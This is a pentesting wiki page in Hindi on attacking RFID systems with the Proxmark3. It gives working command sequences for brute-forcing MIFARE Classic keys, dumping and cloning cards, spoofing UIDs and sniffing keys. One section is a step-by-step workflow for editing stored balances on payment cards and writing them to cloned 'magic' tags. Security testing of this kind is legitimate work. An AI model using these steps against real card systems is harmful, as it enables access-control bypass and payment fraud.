# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 से RFID Systems पर हमला करना

सक्रिय रूप से maintained RRG/Iceman Proxmark3 client और उससे मेल खाने वाला firmware install करें। फिर उस build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB पर हमला करना

MIFARE Classic 1K में **16 sectors** होते हैं, और हर sector में **16 bytes** के **4 blocks** होते हैं। Genuine NXP cards में manufacturer block 0 में UID/manufacturer data होता है और यह read-only होता है; special clone या “magic” cards में इसे rewrite किया जा सकता है।<sup>[[1]](#references)[[2]](#references)</sup>\
हर sector को access करने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो हर sector के **block 3** (sector trailer) में stored होती हैं। Sector trailer में **access bits** भी होते हैं, जो 2 keys का उपयोग करके **हर block** पर **read और write** permissions देते हैं।\
उदाहरण के लिए, अगर आपको पहली key पता है तो उससे read permissions और दूसरी key पता है तो उससे write permissions देना उपयोगी हो सकता है।

कई attacks किए जा सकते हैं

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 से **Tag to Reader communication** को **eavesdrop** करने जैसी अन्य कार्रवाइयाँ भी की जा सकती हैं, ताकि संवेदनशील डेटा खोजा जा सके। इस कार्ड में आप केवल communication को sniff करके इस्तेमाल की गई key की गणना कर सकते हैं, क्योंकि **इस्तेमाल किए गए cryptographic operations कमज़ोर हैं** और plain तथा cipher text पता होने पर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>

#### Stored-value के दुरुपयोग के लिए MiFare Classic का त्वरित वर्कफ़्लो

जब terminals, Classic cards पर balances store करते हैं, तो आम तौर पर end-to-end flow इस प्रकार होता है:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

नोट्स

- `hf mf autopwn` nested/darkside/HardNested-style attacks को orchestrate करता है, keys recover करता है और client dumps folder में dumps बनाता है।<sup>[[1]](#references)</sup>
- Block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। सामान्य Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
- कई deployments में Classic "value blocks" या simple checksums का इस्तेमाल होता है। Editing के बाद सुनिश्चित करें कि सभी duplicated/complemented fields और checksums consistent हों।<sup>[[4]](#references)</sup>

ऊँचे स्तर की methodology और mitigations के लिए देखें:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems में कभी-कभी **nonbranded या noncommercial tags** इस्तेमाल होते हैं। ऐसे में, आप tags को custom **raw commands भेजने** के लिए Proxmark3 का इस्तेमाल कर सकते हैं।

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

इस जानकारी के साथ, आप कार्ड और उससे संवाद करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 raw commands भेजने की सुविधा देता है, जैसे: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 सॉफ़्टवेयर में **automation scripts** की एक preloaded सूची होती है, जिनका उपयोग आप सरल कार्य करने के लिए कर सकते हैं। पूरी सूची पाने के लिए `script list` command का उपयोग करें। इसके बाद, `script run` command के साथ script का नाम दें:

```
proxmark3> script run mfkeys
```

आप tag readers को **fuzz** करने के लिए एक script बना सकते हैं। **valid card** का data कॉपी करने के बाद, बस एक **Lua script** लिखें जो एक या अधिक random **bytes** को **randomize** करे और हर iteration में जाँच करे कि **reader crash** होता है या नहीं।

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF मैजिक कार्ड](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 पर NXP का बयान](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value में NFC कार्ड की vulnerability का exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux इंस्टॉलेशन](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
